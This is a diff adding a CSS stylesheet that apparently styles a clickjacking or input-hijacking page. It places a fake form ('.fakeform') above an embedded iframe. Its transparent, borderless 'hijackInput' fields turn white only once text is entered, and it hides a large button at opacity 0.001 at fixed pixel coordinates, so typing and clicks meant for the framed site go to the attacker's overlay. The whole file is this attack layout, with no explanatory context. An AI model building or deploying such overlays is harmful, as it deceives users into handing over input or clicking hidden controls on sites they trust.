@@ -1,0 +1,46 @@
+body {
+  background-color: #f2f2f2;
+  font-family: "Lato", sans-serif;
+  font-weight: 300;
+  font-size: 16px;
+  color: #555;
+  -webkit-font-smoothing: antialiased;
+  -webkit-overflow-scrolling: touch;
+}
+
+iframe {
+  position: relative;
+  z-index: 1;
+}
+
+.fakeform {
+  position: absolute;
+  left: 537px;
+  top: 572px;
+  z-index: 2;
+}
+
+input.hijackInput {
+  width: 750px;
+  height: 42px;
+  margin-bottom: 15px;
+  border-width: 0px;
+  background-color: transparent;
+}
+
+input[type="text"]:focus {
+  background-color: white;
+  outline-width: 0px;
+}
+
+input[type="text"]:not(:placeholder-shown) {
+  border-width: 0px;
+  background-color: white;
+}
+
+button.btn-large {
+  position: absolute;
+  left: 332px;
+  top: 182px;
+  opacity: 0.001;
+}
